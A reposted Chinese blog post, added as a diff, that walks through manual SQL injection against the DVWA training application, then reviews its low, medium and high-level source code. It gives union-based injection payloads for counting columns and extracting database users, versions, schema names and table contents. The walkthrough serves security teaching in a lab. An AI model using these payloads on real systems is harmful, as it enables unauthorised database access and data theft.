@@ -1,0 +1,73 @@
+---
+layout:     post
+title:      "SQL注入原理-DVWA之php+mysql手工注入「转」"
+subtitle:   "SQL injection principle - DVWA PHP + mysql manual injection"
+date:       2014-9-10
+author:     "LingDie | 靈蝶"
+header-img: "img/blog/2014/zr.jpg"
+tags:
+    - PHP
+    - 安全
+    - SQL注入
+    - 转载
+---
+
+> 下滑这里查看更多内容
+
+1.使用浏览器打开http://192.168.1.3:8080/dvwa/login.php，输入用户名admin，密码password进行登录。登录需要将DVWA的安全级别调整为low。调整之后选择SQL Injection，进入页面。提示输入User ID，输入正确的ID，将显示 ID、First name、Surname信息。可以得知此处为注入点，尝试输入“’”，返回错误。
+<img src="../../../../img/blog/2014/sqlzr/1.png" alt="">
+<img src="../../../../img/blog/2014/sqlzr/2.png" alt="">
+2.尝试输入1 or 1=1遍历数据库没有成功，猜测程序将此处看成了字符型。
+<img src="../../../../img/blog/2014/sqlzr/3.png" alt="">
+3.尝试输入1’ or ‘1’=’1遍历数据库成功，显示出了所有内容。
+<img src="../../../../img/blog/2014/sqlzr/4.png" alt="">
+4.利用order by num语句来测试查询信息列表，修改num的值，这里我们输入1'order by 1 - - (注意--后有空格，后面不再说明)结果页面正常显示。继续测试1'order by 2 -- ,1'order by 3 -- ，当输入3时，页面报错：Unknown column '3' in 'order clause'，由此我们判断查询结果值为2列。
+<img src="../../../../img/blog/2014/sqlzr/5.png" alt="">
+5.输入1' and 1=2 union select 1,2 -- ，从而得出First name处显示结果为查询结果第一列的值，Surname处显示结果为查询结果第二列的值。
+<img src="../../../../img/blog/2014/sqlzr/6.png" alt="">
+6.通过注入1' and 1=2 union select user(),database() -- 得到数据库用户以及数据库名称。
+<img src="../../../../img/blog/2014/sqlzr/7.png" alt="">
+7.通过注入1' and 1=2 union select version(),database() -- 得到数据库版本信息。
+<img src="../../../../img/blog/2014/sqlzr/8.png" alt="">
+8.通过注入1'and 1=2 union select 1,@@global.version_compile_os from mysql.user – 获得操作系统信息。
+<img src="../../../../img/blog/2014/sqlzr/9.png" alt="">
+9.通过注入1' and 1=2 union select 1,schema_name from information_schema.schemata -- 查询mysql所有数据库名字。
+<img src="../../../../img/blog/2014/sqlzr/10.png" alt="">
+10.通过注入1' and exists(select * from users) -- 猜解dvwa数据库中的表名。
+<img src="../../../../img/blog/2014/sqlzr/11.png" alt="">
+11.猜解字段名1' and exists(select 表名 from users) -- ，这里测试的字段名有first_name和last_name：1' and exists(select first_name from users) -- 和1' and exists(select last_name from users) – 。
+<img src="../../../../img/blog/2014/sqlzr/12.png" alt="">
+<img src="../../../../img/blog/2014/sqlzr/13.png" alt="">
+12.爆出数据库中字段的内容 1' and 1=2 union select first_name,last_name from users -- ，这里其实如果是存放管理员账户的表，那么用户名、密码信息字段就可以爆出来了。
+<img src="../../../../img/blog/2014/sqlzr/14.png" alt="">
+13.查看low等级源代码。通过代码可以看出，对输入$id的值没有进行任何过滤就直接放入了SQL语句中进行处理，这样带来了极大的隐患。
+<img src="../../../../img/blog/2014/sqlzr/15.png" alt="">
+14.查看medium等级源代码。通过代码可以看出，对输入的$id的值使用mysql_real_eascape_string()函数进行了处理。在PHP中，使用mysql_real_eascape_string()函数用来转义SQL语句中使用字符串的特殊字符。但是使用这个函数对参数进行转换是存在绕过的。只需要将攻击字符进行转换一下编码格式即可绕过该防护函数。比如使用url编码等方式。同时发现SQL语句中变成了WHERE user_id = $id”，此处变成了数字型注入，所以此处使用mysql_real_escape_string()函数并没有起到防护的作用。
+<img src="../../../../img/blog/2014/sqlzr/16.png" alt="">
+15.查看high等级源代码。通过代码可以看出，对传入$id的值使用stripslashes()函数处理以后再使用$mysql_real_escape_string()函数进行处理。默认情况下，PHP会对所有的GET，POST和cookie数据自动运行addslashes()，addslashes()函数在每个双引号前添加反斜杠。
+运行结果：Shanghai is the \"biggest\" city in China.
+
+{% highlight ruby %}
+
+<!DOCTYPE html>
+<html>
+<body>
+
+<?php 
+$str = addslashes('Shanghai is the "biggest" city in China.');
+echo($str); 
+?>  
+
+</body>
+</html>
+
+{% endhighlight %}
+
+stripslashes()函数则是删除由addslashes()函数添加的反斜杠。在使用这两个函数进行过滤之后再使用is_numric()函数检查$id的值是否为数字，彻底断绝了注入的存在。
+<img src="../../../../img/blog/2014/sqlzr/17.png" alt="">
+
+{% highlight ruby %}
+
+
+
+{% endhighlight %}
